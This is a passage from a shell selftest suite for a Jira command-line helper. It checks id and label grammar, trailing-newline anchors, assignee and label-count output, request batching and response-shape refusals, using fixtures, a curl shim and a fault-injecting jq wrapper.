  # --- T2b2 fix2 Q-m1 (T2b2 fix3 F-4 hardening): a page-1 `nextPageToken` of "T\n" (a TRAILING
  # newline only, no embedded newline) must ALSO be refused (rc 2, empty stdout) — the 0c leg above
  # ("T\nX", an embedded newline) cannot distinguish `\z` (absolute string end) from `$` (end-of-line,
  # which in this regex engine also matches immediately before a single trailing newline): both
  # anchors already reject "T\nX", so a `\z`->`$` regression would pass 0c silently. Only a
  # TRAILING-only newline tells them apart — `\z` refuses it, `$` would wrongly accept it. T2b2 fix3
  # F-4: the ORIGINAL version of this leg asserted only rc 2 + empty stdout — under the `\z`->`$`
  # mutant that reds ONLY BY ACCIDENT: `$` wrongly ACCEPTS "T\n" as a token, the loop advances to a
  # SECOND request, reuses the SAME single queued fixture (no second fixture was ever queued), and
  # the cross-page dedup check (F-6) then trips on the repeated key — rc 1, "a key was repeated
  # across pages", not rc 2 at all. The rc mismatch (1 != 2) happens to still fail the old assertion,
  # but for the dedup reason, not the token-grammar reason. Now also asserts exactly ONE request and
  # the token-grammar's own fixed sentence, so the mutant reds for the RIGHT reason. -----------------
  _tj_fx list-page1-trailing-newline-token
  : > "$argvlog"
  tnlrc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/tnl.out" 2>"$tmpd/tnl.err" || tnlrc=$?
  tnl_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$tnlrc" -eq 2 ] && [ ! -s "$tmpd/tnl.out" ] && [ "$tnl_reqs" -eq 1 ] \
    && grep -q "unverified: list truncated (page not complete)" "$tmpd/tnl.err"; then
    echo "PASS: selftest — a page token carrying ONLY a trailing newline is refused, rc 2, empty stdout, exactly one request, the token-grammar sentence (not the dedup check) — the \\z anchor, not \$, is pinned (T2b2 fix2 Q-m1 / fix3 F-4)"
  else
    echo "FAIL: selftest — a page token carrying only a trailing newline was not refused for the right reason (rc=$tnlrc reqs=$tnl_reqs out='$(cat "$tmpd/tnl.out" 2>/dev/null)' err='$(cat "$tmpd/tnl.err" 2>/dev/null)')"; sfail=1
  fi

}
_tj_st_assignee() {

  # --- T3ac step 0a (T2c seat L-1): tj_get_issue keeps its own inline id grammar instead of the
  # shared _tj_id_ok, so a leading-zero id (AB-07) is wrongly accepted before any request.
  : > "$argvlog"
  _tj_fx cloud-issue-good
  s0a_rc=0
  tj_get_issue https://ex.atlassian.net cloud AB AB-07 >/dev/null 2>"$tmpd/s0a.err" || s0a_rc=$?
  s0a_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$s0a_rc" -eq 1 ] && [ "$s0a_reqs" -eq 0 ]; then
    echo "PASS: selftest — get-issue refuses a leading-zero id (AB-07) before any request, rc 1, zero requests, via the shared _tj_id_ok (T3ac step 0a / L-1)"
  else
    echo "FAIL: selftest — get-issue did not refuse AB-07 pre-request (rc=$s0a_rc reqs=$s0a_reqs err='$(cat "$tmpd/s0a.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3ac step 0c (T2c seat L-3): _tj_status_id_ok gains a length bound (<=10 digits) — an
  # 11-digit status id must refuse before any request (via tj_list_in_states, which checks status
  # ids before any request).
  : > "$argvlog"
  s0c_rc=0
  tj_list_in_states https://ex.atlassian.net cloud AB 200 12345678901 >/dev/null 2>"$tmpd/s0c.err" || s0c_rc=$?
  s0c_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$s0c_rc" -eq 1 ] && [ "$s0c_reqs" -eq 0 ]; then
    echo "PASS: selftest — a status id longer than 10 digits refuses before any request, rc 1, zero requests (T3ac step 0c / L-3)"
  else
    echo "FAIL: selftest — an 11-digit status id was not refused pre-request (rc=$s0c_rc reqs=$s0c_reqs err='$(cat "$tmpd/s0c.err" 2>/dev/null)')"; sfail=1
  fi

  # --- M-G8: _tj_id_ok's rest-of-id digit grammar, exercised via a write path (tj_assign_self) —
  # a digit followed by a non-digit (AB-1x2) or a second dash (AB-1-2) must refuse before any
  # request, rc 1, the fixed grammar sentence, zero requests (no existing leg fed either shape
  # through a write path; only whole-non-digit/leading-zero shapes were covered before).
  for g8_id in AB-1x2 AB-1-2; do
    : > "$argvlog"
    g8_rc=0
    tj_assign_self https://ex.atlassian.net cloud AB "$g8_id" >"$tmpd/g8.out" 2>"$tmpd/g8.err" || g8_rc=$?
    g8_reqs=$(wc -l < "$argvlog" | tr -d ' ')
    g8_errok=0
    grep -qx "refused: id does not match project (grammar)" "$tmpd/g8.err" && g8_errok=1
    if [ "$g8_rc" -eq 1 ] && [ "$g8_reqs" -eq 0 ] && [ "$g8_errok" -eq 1 ] && [ ! -s "$tmpd/g8.out" ]; then
      echo "PASS: selftest — tj_assign_self refuses a rest-of-id digit-grammar violation ('$g8_id') before any request, rc 1, zero requests, exact sentence (M-G8)"
    else
      echo "FAIL: selftest — tj_assign_self did not refuse '$g8_id' pre-request (rc=$g8_rc reqs=$g8_reqs errok=$g8_errok out='$(cat "$tmpd/g8.out" 2>/dev/null)' err='$(cat "$tmpd/g8.err" 2>/dev/null)')"; sfail=1
    fi
  done

  # --- T3ac leg 1: get-issue stdout gains assignee-present<TAB>true|false; FILE cmp against
  # ops/get-issue-assigned.out / ops/get-issue-unassigned.out, Cloud AND DC (real Atlassian shapes,
  # https://developer.atlassian.com/cloud/jira/platform/rest/v3/api-group-issues/ v3 Get issue;
  # DC v2 https://docs.atlassian.com/software/jira/docs/api/REST/9.12.0/#api/2/issue-getIssue).
  opsdir="$fixdir/ops"
  _tj_fx cloud-issue-assigned
  l1a_rc=0
  tj_get_issue https://ex.atlassian.net cloud AB AB-7 > "$tmpd/l1a.out" 2>"$tmpd/l1a.err" || l1a_rc=$?
  l1a_ok=0; [ "$l1a_rc" -eq 0 ] && cmp -s "$tmpd/l1a.out" "$opsdir/get-issue-assigned.out" && l1a_ok=1
  if [ "$l1a_ok" -eq 1 ]; then
    echo "PASS: selftest — get-issue on an assigned Cloud fixture matches ops/get-issue-assigned.out byte-for-byte, rc 0 (T3ac leg 1)"
  else
    echo "FAIL: selftest — get-issue Cloud assigned output did not match ops/get-issue-assigned.out (rc=$l1a_rc out='$(cat "$tmpd/l1a.out" 2>/dev/null)' err='$(cat "$tmpd/l1a.err" 2>/dev/null)')"; sfail=1
  fi

  _tj_fx cloud-issue-unassigned
  l1b_rc=0
  tj_get_issue https://ex.atlassian.net cloud AB AB-7 > "$tmpd/l1b.out" 2>"$tmpd/l1b.err" || l1b_rc=$?
  l1b_ok=0; [ "$l1b_rc" -eq 0 ] && cmp -s "$tmpd/l1b.out" "$opsdir/get-issue-unassigned.out" && l1b_ok=1
  if [ "$l1b_ok" -eq 1 ]; then
    echo "PASS: selftest — get-issue on an unassigned Cloud fixture matches ops/get-issue-unassigned.out byte-for-byte, rc 0 (T3ac leg 1)"
  else
    echo "FAIL: selftest — get-issue Cloud unassigned output did not match ops/get-issue-unassigned.out (rc=$l1b_rc out='$(cat "$tmpd/l1b.out" 2>/dev/null)' err='$(cat "$tmpd/l1b.err" 2>/dev/null)')"; sfail=1
  fi

  _tj_fx dc-issue-assigned
  l1c_rc=0
  tj_get_issue https://ex.example.com datacenter AB AB-7 > "$tmpd/l1c.out" 2>"$tmpd/l1c.err" || l1c_rc=$?
  l1c_ok=0; [ "$l1c_rc" -eq 0 ] && cmp -s "$tmpd/l1c.out" "$opsdir/get-issue-assigned.out" && l1c_ok=1
  if [ "$l1c_ok" -eq 1 ]; then
    echo "PASS: selftest — get-issue on an assigned DC fixture matches ops/get-issue-assigned.out byte-for-byte, rc 0 (T3ac leg 1)"
  else
    echo "FAIL: selftest — get-issue DC assigned output did not match ops/get-issue-assigned.out (rc=$l1c_rc out='$(cat "$tmpd/l1c.out" 2>/dev/null)' err='$(cat "$tmpd/l1c.err" 2>/dev/null)')"; sfail=1
  fi

  _tj_fx dc-issue-unassigned
  l1d_rc=0
  tj_get_issue https://ex.example.com datacenter AB AB-7 > "$tmpd/l1d.out" 2>"$tmpd/l1d.err" || l1d_rc=$?
  l1d_ok=0; [ "$l1d_rc" -eq 0 ] && cmp -s "$tmpd/l1d.out" "$opsdir/get-issue-unassigned.out" && l1d_ok=1
  if [ "$l1d_ok" -eq 1 ]; then
    echo "PASS: selftest — get-issue on an unassigned DC fixture matches ops/get-issue-unassigned.out byte-for-byte, rc 0 (T3ac leg 1)"
  else
    echo "FAIL: selftest — get-issue DC unassigned output did not match ops/get-issue-unassigned.out (rc=$l1d_rc out='$(cat "$tmpd/l1d.out" 2>/dev/null)' err='$(cat "$tmpd/l1d.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3ac leg 2: the request URL's fields= is exactly "status,project,assignee" (shim .lastcfg).
  _tj_fx cloud-issue-assigned
  tj_get_issue https://ex.atlassian.net cloud AB AB-7 >/dev/null 2>&1 || true
  l2_lasturl=$(cat "$tmpd/.lasturl" 2>/dev/null || true)
  case "$l2_lasturl" in
    *'?fields=status,project,assignee') l2_ok=1 ;;
    *) l2_ok=0 ;;
  esac
  if [ "$l2_ok" -eq 1 ]; then
    echo "PASS: selftest — get-issue's request URL fields= is exactly status,project,assignee (T3ac leg 2)"
  else
    echo "FAIL: selftest — get-issue's request URL fields= did not match (url='$l2_lasturl')"; sfail=1
  fi

  # --- T3ac leg 3: no accountId/displayName/emailAddress byte from the assignee fixture reaches
  # stdout OR stderr — only the boolean is ever extracted (whole-output oracle; the class is proven
  # by the "print assignee.displayName instead of the boolean" mutant below).
  _tj_fx cloud-issue-assigned
  l3_rc=0
  tj_get_issue https://ex.atlassian.net cloud AB AB-7 > "$tmpd/l3.out" 2>"$tmpd/l3.err" || l3_rc=$?
  l3_ok=1
  for _l3_needle in "5b10a2844c20165700ede21g" "Mia Krystof" "mia@example.com"; do
    grep -qF "$_l3_needle" "$tmpd/l3.out" "$tmpd/l3.err" 2>/dev/null && l3_ok=0
  done
  if [ "$l3_ok" -eq 1 ]; then
    echo "PASS: selftest — no accountId/displayName/emailAddress byte from the assignee fixture reaches stdout or stderr (T3ac leg 3)"
  else
    echo "FAIL: selftest — an assignee identity byte leaked onto stdout or stderr (out='$(cat "$tmpd/l3.out" 2>/dev/null)' err='$(cat "$tmpd/l3.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3ac-fix1 B6 (quality m4): leg 3 also greps the DATA CENTER assignee identity values
  # (self/name/key/emailAddress/displayName/active shape differs from Cloud's accountId-based one).
  _tj_fx dc-issue-assigned
  b6_rc=0
  tj_get_issue https://ex.example.com datacenter AB AB-7 > "$tmpd/b6.out" 2>"$tmpd/b6.err" || b6_rc=$?
  b6_ok=1
  for _b6_needle in "jsmith" "John Smith" "jsmith@example.com"; do
    grep -qF "$_b6_needle" "$tmpd/b6.out" "$tmpd/b6.err" 2>/dev/null && b6_ok=0
  done
  if [ "$b6_ok" -eq 1 ]; then
    echo "PASS: selftest — no name/key/displayName/emailAddress byte from the DC assignee fixture reaches stdout or stderr (T3ac-fix1 B6)"
  else
    echo "FAIL: selftest — a DC assignee identity byte leaked onto stdout or stderr (rc=$b6_rc out='$(cat "$tmpd/b6.out" 2>/dev/null)' err='$(cat "$tmpd/b6.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3ac leg 4: an assignee that is neither null nor an object -> rc 2, fixed sentence
  # (invariant 3 — every response shape is asserted, never assumed).
  _tj_fx cloud-issue-assignee-bad-shape
  l4_rc=0
  l4_err=$(tj_get_issue https://ex.atlassian.net cloud AB AB-7 2>&1 >/dev/null) || l4_rc=$?
  if [ "$l4_rc" -eq 2 ] && [ "$l4_err" = "unverified: jira response assignee field failed the expected shape" ]; then
    echo "PASS: selftest — an assignee that is neither null nor an object yields rc 2, the fixed sentence (T3ac leg 4)"
  else
    echo "FAIL: selftest — a malformed assignee was not cleanly refused (rc=$l4_rc err='$l4_err')"; sfail=1
  fi

  # --- T3ac-fix1 B2: a MISSING assignee field (never requested/never sent) is not "unassigned" —
  # `.fields|has("assignee")` must be false-checked explicitly, rc 2, the same fixed sentence.
  _tj_fx cloud-issue-no-assignee-field
  b2gi_rc=0
  b2gi_err=$(tj_get_issue https://ex.atlassian.net cloud AB AB-7 2>&1 >/dev/null) || b2gi_rc=$?
  if [ "$b2gi_rc" -eq 2 ] && [ "$b2gi_err" = "unverified: jira response assignee field failed the expected shape" ]; then
    echo "PASS: selftest — a response with no assignee field at all (not null) is refused, rc 2, the fixed sentence (T3ac-fix1 B2)"
  else
    echo "FAIL: selftest — a missing assignee field was treated as unassigned (rc=$b2gi_rc err='$b2gi_err')"; sfail=1
  fi

  # --- T3ac-fix1 B4 (security L-5 / quality m3): zero ids refused before any check or request,
  # matching list-in-states' own zero-status-id rule.
  : > "$argvlog"
  b4_rc=0
  tj_label_counts https://ex.atlassian.net cloud AB size >/dev/null 2>"$tmpd/b4.err" || b4_rc=$?
  b4_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$b4_rc" -eq 1 ] && [ "$b4_reqs" -eq 0 ] && [ "$(cat "$tmpd/b4.err" 2>/dev/null)" = "refused: label-counts requires at least one id" ]; then
    echo "PASS: selftest — label-counts with zero ids refuses, rc 1, zero requests, the fixed sentence (T3ac-fix1 B4)"
  else
    echo "FAIL: selftest — zero ids was not refused pre-request (rc=$b4_rc reqs=$b4_reqs err='$(cat "$tmpd/b4.err" 2>/dev/null)')"; sfail=1
  fi

}
_tj_st_label_counts() {

  # --- T3ac leg 5: label-counts prints key<TAB>count (labels matching ^size:[A-Za-z0-9_-]{1,32}$,
  # \A…\z anchors in jq), LC_ALL=C sorted -> FILE cmp ops/label-counts.out.
  _tj_fx cloud-labels-page
  l5_rc=0
  tj_label_counts https://ex.atlassian.net cloud AB size AB-1 AB-2 AB-3 AB-4 > "$tmpd/l5.out" 2>"$tmpd/l5.err" || l5_rc=$?
  l5_ok=0; [ "$l5_rc" -eq 0 ] && cmp -s "$tmpd/l5.out" "$opsdir/label-counts.out" && l5_ok=1
  if [ "$l5_ok" -eq 1 ]; then
    echo "PASS: selftest — label-counts matches ops/label-counts.out byte-for-byte, rc 0 (T3ac leg 5)"
  else
    echo "FAIL: selftest — label-counts output did not match ops/label-counts.out (rc=$l5_rc out='$(cat "$tmpd/l5.out" 2>/dev/null)' err='$(cat "$tmpd/l5.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3x leg 4 (carried from the T3ac fix1 quality seat R1 — a missing pin on correct code): 101
  # distinct ids batch into TWO `_tj_lc_fetch_batch` calls (100 then 1); a CORRECT run must return
  # all 101 keys, C-sorted, over exactly two requests — pins the second-batch write staying `>>`.
  t3x4_i=1; t3x4_ids=""
  while [ "$t3x4_i" -le 101 ]; do
    t3x4_ids="$t3x4_ids AB-$t3x4_i"
    t3x4_i=$((t3x4_i + 1))
  done
  _tj_fxseq lc-batch-100 lc-batch-101
  : > "$argvlog"
  t3x4_rc=0
  set -f
  # shellcheck disable=SC2086
  tj_label_counts https://ex.atlassian.net cloud AB size $t3x4_ids > "$tmpd/t3x4.out" 2>"$tmpd/t3x4.err" || t3x4_rc=$?
  set +f
  t3x4_lines=$(wc -l < "$tmpd/t3x4.out" | tr -d ' ')
  t3x4_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  t3x4_sorted=0; LC_ALL=C sort -c "$tmpd/t3x4.out" 2>/dev/null && t3x4_sorted=1
  t3x4_distinct=$(cut -f1 "$tmpd/t3x4.out" 2>/dev/null | LC_ALL=C sort -u | wc -l | tr -d ' ')
  if [ "$t3x4_rc" -eq 0 ] && [ "$t3x4_lines" -eq 101 ] && [ "$t3x4_reqs" -eq 2 ] && [ "$t3x4_sorted" -eq 1 ] && [ "$t3x4_distinct" -eq 101 ]; then
    echo "PASS: selftest — label-counts on 101 distinct ids (two real-shaped pages) returns all 101 keys, C-sorted, over exactly two requests, rc 0 (T3x leg 4)"
  else
    echo "FAIL: selftest — label-counts' two-batch answer was not correct (rc=$t3x4_rc lines=$t3x4_lines reqs=$t3x4_reqs sorted=$t3x4_sorted distinct=$t3x4_distinct err='$(cat "$tmpd/t3x4.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3ac leg 6: labels failing the grammar are ignored and never printed; the hostile/ESC
  # labels on AB-4 (a quote+newline label, an ESC-bearing label) reach neither stream.
  _tj_fx cloud-labels-page
  tj_label_counts https://ex.atlassian.net cloud AB size AB-1 AB-2 AB-3 AB-4 > "$tmpd/l6.out" 2>"$tmpd/l6.err" || true
  l6_esc=$(printf '\033')
  l6_ok=1
  grep -qF 'size:S"' "$tmpd/l6.out" "$tmpd/l6.err" 2>/dev/null && l6_ok=0
  grep -qF "$l6_esc" "$tmpd/l6.out" "$tmpd/l6.err" 2>/dev/null && l6_ok=0
  if [ "$l6_ok" -eq 1 ]; then
    echo "PASS: selftest — the hostile/ESC labels never reach stdout or stderr, and a grammar-failing label is never counted (T3ac leg 6 / F-8)"
  else
    echo "FAIL: selftest — a hostile label byte leaked onto stdout or stderr (out='$(cat "$tmpd/l6.out" 2>/dev/null)' err='$(cat "$tmpd/l6.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3ac leg 6b (mutant 4's own anchor pin): a label whose grammar-valid content is followed by
  # a TRAILING newline ("size:Sx\n") must NOT count — \A...\z requires the absolute string end,
  # while jq's ^...$ would wrongly match right before that trailing newline (the same distinction
  # _tj_sa_page_status's own token check already pins for a page token, T2b2 fix2 Q-m1).
  _tj_fx cloud-labels-trailing-newline
  l6b_rc=0
  tj_label_counts https://ex.atlassian.net cloud AB size AB-5 > "$tmpd/l6b.out" 2>"$tmpd/l6b.err" || l6b_rc=$?
  if [ "$l6b_rc" -eq 0 ] && [ "$(cat "$tmpd/l6b.out" 2>/dev/null)" = "$(printf 'AB-5\t0')" ]; then
    echo "PASS: selftest — a label with a trailing newline after otherwise-valid content is not counted, the \\z anchor (not \$) is pinned (T3ac leg 6b)"
  else
    echo "FAIL: selftest — a trailing-newline label was wrongly counted (rc=$l6b_rc out='$(cat "$tmpd/l6b.out" 2>/dev/null)')"; sfail=1
  fi

  # --- T3ac-fix1 B2 (quality F1 / security L-2): every issue's `.fields` must be an object and
  # `.fields.labels` an array, else rc 2, the fixed sentence, empty stdout — never assumed (invariant
  # 3). Four shapes: labels an object, labels a string, labels absent, fields absent entirely.
  b2_fix="unverified: search response issue did not carry the expected labels shape"
  for b2_case in shape-object shape-string shape-absent shape-nofields; do
    _tj_fx "cloud-labels-$b2_case"
    b2_rc=0
    b2_out=$(tj_label_counts https://ex.atlassian.net cloud AB size AB-1 2>"$tmpd/b2.err") || b2_rc=$?
    b2_err=$(cat "$tmpd/b2.err" 2>/dev/null)
    if [ "$b2_rc" -eq 2 ] && [ -z "$b2_out" ] && [ "$b2_err" = "$b2_fix" ]; then
      echo "PASS: selftest — label-counts refuses a malformed labels/fields shape ($b2_case), rc 2, empty stdout, the fixed sentence (T3ac-fix1 B2)"
    else
      echo "FAIL: selftest — a malformed labels/fields shape ($b2_case) was not refused cleanly (rc=$b2_rc out='$b2_out' err='$b2_err')"; sfail=1
    fi
  done

  # --- T3ac leg 7a: the recorded body's JQL is exactly project = "AB" AND key in (AB-1,...,AB-4).
  _tj_fx cloud-labels-page
  tj_label_counts https://ex.atlassian.net cloud AB size AB-1 AB-2 AB-3 AB-4 >/dev/null 2>&1 || true
  l7a_lastbody=$(cat "$tmpd/.lastbody" 2>/dev/null || true)
  case "$l7a_lastbody" in
    *'"project = \"AB\" AND key in (AB-1,AB-2,AB-3,AB-4)"'*) l7a_ok=1 ;;
    *) l7a_ok=0 ;;
  esac
  if [ "$l7a_ok" -eq 1 ]; then
    echo "PASS: selftest — label-counts' recorded JQL is exactly the quoted-project, unquoted-ids string (T3ac leg 7a / F-12d)"
  else
    echo "FAIL: selftest — label-counts' recorded JQL did not match (body='$l7a_lastbody')"; sfail=1
  fi

  # --- T3ac leg 7b: an id failing _tj_id_ok (cross-project) refuses before any request, rc 1.
  : > "$argvlog"
  l7b_rc=0
  tj_label_counts https://ex.atlassian.net cloud AB size AB-1 ZZ-9 >/dev/null 2>"$tmpd/l7b.err" || l7b_rc=$?
  l7b_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$l7b_rc" -eq 1 ] && [ "$l7b_reqs" -eq 0 ]; then
    echo "PASS: selftest — label-counts refuses a cross-project id before any request, rc 1, zero requests (T3ac leg 7b)"
  else
    echo "FAIL: selftest — a cross-project id was not refused pre-request (rc=$l7b_rc reqs=$l7b_reqs err='$(cat "$tmpd/l7b.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3ac leg 7c: a prefix failing ^[a-z]+$ refuses before any request, rc 1.
  : > "$argvlog"
  l7c_rc=0
  tj_label_counts https://ex.atlassian.net cloud AB Size1 AB-1 >/dev/null 2>"$tmpd/l7c.err" || l7c_rc=$?
  l7c_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$l7c_rc" -eq 1 ] && [ "$l7c_reqs" -eq 0 ]; then
    echo "PASS: selftest — label-counts refuses a prefix failing ^[a-z]+\$ before any request, rc 1, zero requests (T3ac leg 7c)"
  else
    echo "FAIL: selftest — a bad prefix was not refused pre-request (rc=$l7c_rc reqs=$l7c_reqs err='$(cat "$tmpd/l7c.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3ac-fix1 B3 (security L-1): the prefix grammar must be locale-independent — `*[!a-z]*`
  # wrongly accepts "Size" under LC_ALL=en_US.UTF-8 on macOS sh. Same fresh-process mechanism as the
  # project-grammar locale leg above: a standalone driver (this file's own function definitions, no
  # CLI dispatch) run under sh, dash and bash with LC_ALL=en_US.UTF-8 set BEFORE the shell starts.
  _tj_fx cloud-labels-page
  _tj_lc_check="$tmpd/locale-check-lc-prefix.sh"
  _tj_cli_line=$(grep -n '^# --- CLI' "$0" | head -1 | cut -d: -f1)
  head -n $((_tj_cli_line - 1)) "$0" > "$_tj_lc_check"
  {
    printf '_TJ_CURL_BIN="$1"; shift\n'
    printf 'tj_label_counts https://ex.atlassian.net cloud AB Size AB-1\n'
  } >> "$_tj_lc_check"
  : > "$argvlog"
  rc=0
  b3_out=$(LC_ALL=en_US.UTF-8 sh "$_tj_lc_check" "$shim" 2>/dev/null) || rc=$?
  b3_sh_ok=0; [ "$rc" -eq 1 ] && [ -z "$b3_out" ] && [ ! -s "$argvlog" ] && b3_sh_ok=1
  b3_dash_note=""
  if command -v dash >/dev/null 2>&1; then
    : > "$argvlog"
    rc=0
    b3_out=$(LC_ALL=en_US.UTF-8 dash "$_tj_lc_check" "$shim" 2>/dev/null) || rc=$?
    b3_dash_ok=0; [ "$rc" -eq 1 ] && [ -z "$b3_out" ] && [ ! -s "$argvlog" ] && b3_dash_ok=1
  else
    b3_dash_ok=1
    b3_dash_note=" (dash arm SKIPPED — UNVERIFIED: no dash on PATH)"
  fi
  b3_bash_note=""
  if command -v bash >/dev/null 2>&1; then
    : > "$argvlog"
    rc=0
    b3_out=$(LC_ALL=en_US.UTF-8 bash "$_tj_lc_check" "$shim" 2>/dev/null) || rc=$?
    b3_bash_ok=0; [ "$rc" -eq 1 ] && [ -z "$b3_out" ] && [ ! -s "$argvlog" ] && b3_bash_ok=1
  else
    b3_bash_ok=1
    b3_bash_note=" (bash arm SKIPPED — UNVERIFIED: no bash on PATH)"
  fi
  b3_locale_note=""
  if ! command -v locale >/dev/null 2>&1 || ! locale -a 2>/dev/null | grep -qi '^en_us\.utf-\?8$'; then
    b3_locale_note=" (locale UNVERIFIED — en_US.UTF-8 not in \`locale -a\`)"
  fi
  if [ "$b3_sh_ok" -eq 1 ] && [ "$b3_dash_ok" -eq 1 ] && [ "$b3_bash_ok" -eq 1 ]; then
    echo "PASS: selftest — label-counts prefix 'Size' refuses, rc 1, zero requests, under LC_ALL=en_US.UTF-8 on a fresh sh, dash and bash process${b3_dash_note}${b3_bash_note}${b3_locale_note} (T3ac-fix1 B3)"
  else
    echo "FAIL: selftest — 'Size' was not refused under LC_ALL=en_US.UTF-8 (sh_ok=$b3_sh_ok dash_ok=$b3_dash_ok bash_ok=$b3_bash_ok)"; sfail=1
  fi

  # --- T3ac-fix1 B1 (security M-1 — fail-open): the response key set must EXACTLY match the
  # requested set (sorted-array equality), not merely "each returned key is a member" — a subset
  # check lets a server that answers every batch with the SAME small set look complete. rc 2,
  # "unverified: search response did not cover the requested id set" (supersedes the old T3ac leg 8
  # rc 1 "outside the requested set" wording, which only ever caught the extra-key half of this bug).

  # B1 leg (i) / T3ac leg 8 (4 requested / 1 valid returned — an extra key AND 3 missing keys, both
  # covered by the one exact-match check): rc 2, empty stdout.
  _tj_fx cloud-labels-extra-key
  l8_rc=0
  l8_err=""
  tj_label_counts https://ex.atlassian.net cloud AB size AB-1 AB-2 AB-3 AB-4 > "$tmpd/l8.out" 2>"$tmpd/l8.err" || l8_rc=$?
  l8_err=$(cat "$tmpd/l8.err" 2>/dev/null)
  if [ "$l8_rc" -eq 2 ] && [ ! -s "$tmpd/l8.out" ] && [ "$l8_err" = "unverified: search response did not cover the requested id set" ]; then
    echo "PASS: selftest — 4 requested / 1 valid returned refuses, rc 2, empty stdout, the fixed sentence (T3ac-fix1 B1 / T3ac leg 8)"
  else
    echo "FAIL: selftest — a mismatched returned set was not refused cleanly (rc=$l8_rc out='$(cat "$tmpd/l8.out" 2>/dev/null)' err='$l8_err')"; sfail=1
  fi

  # B1 leg (ii): 200 distinct requested ids, batched into 2 batches of 100 — a server answering BOTH
  # batches with the SAME small AB-1..AB-4 set (cloud-labels-page.json) must refuse, rc 2, empty
  # stdout (the old subset-only check would have printed AB-1..AB-4 twice and silently dropped 196
  # of the 200 requested keys — the demonstrated fail-open).
  _tj_fxseq cloud-labels-page cloud-labels-page
  set -- https://ex.atlassian.net cloud AB size
  b1ii_i=1
  while [ "$b1ii_i" -le 200 ]; do
    set -- "$@" "AB-$b1ii_i"
    b1ii_i=$((b1ii_i + 1))
  done
  b1ii_rc=0
  b1ii_err=""
  tj_label_counts "$@" > "$tmpd/b1ii.out" 2>"$tmpd/b1ii.err" || b1ii_rc=$?
  b1ii_err=$(cat "$tmpd/b1ii.err" 2>/dev/null)
  if [ "$b1ii_rc" -eq 2 ] && [ ! -s "$tmpd/b1ii.out" ] && [ "$b1ii_err" = "unverified: search response did not cover the requested id set" ]; then
    echo "PASS: selftest — 200 ids, both batches answered with the same 4-key page, refuses rc 2, empty stdout (T3ac-fix1 B1 leg ii)"
  else
    echo "FAIL: selftest — a same-page-duplicate 200-id read was not refused cleanly (rc=$b1ii_rc out='$(cat "$tmpd/b1ii.out" 2>/dev/null)' err='$b1ii_err')"; sfail=1
  fi

  # B1 leg (iii): a caller-duplicated id is deduped BEFORE batching — one output line, rc 0. Scaled
  # to 101 copies of the SAME id (not 101 distinct ids) so the required "no id dedup" mutant is
  # observable: without dedup this splits into 2 batches (100 + 1) against a fixture that answers
  # every request with the same single AB-1 row, so the concatenated result carries AB-1 TWICE
  # against a requested set of one — caught by the same exact-match check as leg (ii), rc 2 instead
  # of the correct rc 0 / one line.
  _tj_fx cloud-labels-single
  set -- https://ex.atlassian.net cloud AB size
  b1iii_i=1
  while [ "$b1iii_i" -le 101 ]; do
    set -- "$@" AB-1
    b1iii_i=$((b1iii_i + 1))
  done
  : > "$argvlog"
  b1iii_rc=0
  tj_label_counts "$@" > "$tmpd/b1iii.out" 2>"$tmpd/b1iii.err" || b1iii_rc=$?
  b1iii_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$b1iii_rc" -eq 0 ] && [ "$b1iii_reqs" -eq 1 ] && [ "$(cat "$tmpd/b1iii.out" 2>/dev/null)" = "$(printf 'AB-1\t1')" ]; then
    echo "PASS: selftest — 101 copies of one caller-duplicated id dedup to a single request, one output line, rc 0 (T3ac-fix1 B1 leg iii)"
  else
    echo "FAIL: selftest — a caller-duplicated id was not deduped before batching (rc=$b1iii_rc reqs=$b1iii_reqs out='$(cat "$tmpd/b1iii.out" 2>/dev/null)' err='$(cat "$tmpd/b1iii.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T3ac-fix1 B5 (security L-4 / quality m2): the membership/exact-match jq computation failing
  # must print ONE fixed sentence, never a silent rc 2 — a PATH-level `jq` wrapper (root-safe: faults
  # by argv match, never a permission bit) targets ONLY the `-r -s --argjson want` exact-match call.
  b5libin="$tmpd/b5libin"; mkdir -p "$b5libin"
  REALJQ=$(command -v jq); export REALJQ
  cat > "$b5libin/jq" <<'FIVEBJQEOF'
#!/bin/sh
if [ "$1" = "-r" ] && [ "$2" = "-s" ] && [ "$3" = "--argjson" ] && [ "$4" = "want" ]; then
  exit 1
fi
exec "$REALJQ" "$@"
FIVEBJQEOF
  chmod +x "$b5libin/jq"
  _tj_fx cloud-labels-page
  b5_origpath=$PATH
  PATH="$b5libin:$PATH"; export PATH
  hash -r 2>/dev/null || true
  b5_rc=0
  b5_out=$(tj_label_counts https://ex.atlassian.net cloud AB size AB-1 AB-2 AB-3 AB-4 2>"$tmpd/b5.err") || b5_rc=$?
  PATH=$b5_origpath; export PATH
  b5_err=$(cat "$tmpd/b5.err" 2>/dev/null)
  if [ "$b5_rc" -eq 2 ] && [ -z "$b5_out" ] && [ "$b5_err" = "unverified: could not verify the requested id set" ]; then
    echo "PASS: selftest — label-counts' membership check is guarded, rc 2, empty stdout, the fixed sentence (T3ac-fix1 B5)"
  else
    echo "FAIL: selftest — a failing membership jq was not refused cleanly (rc=$b5_rc out='$b5_out' err='$b5_err')"; sfail=1
  fi

  # --- T3ac leg 9: more than 100 ids -> batched queries of <=100 (request count + each body's key
  # list). .body.<n> is a per-request numbered log the shim writes above (T3ac leg 9 instrumentation).
  # T3ac-fix1 B1: cloud-labels-empty returns ZERO issues for either batch, so the exact-match check
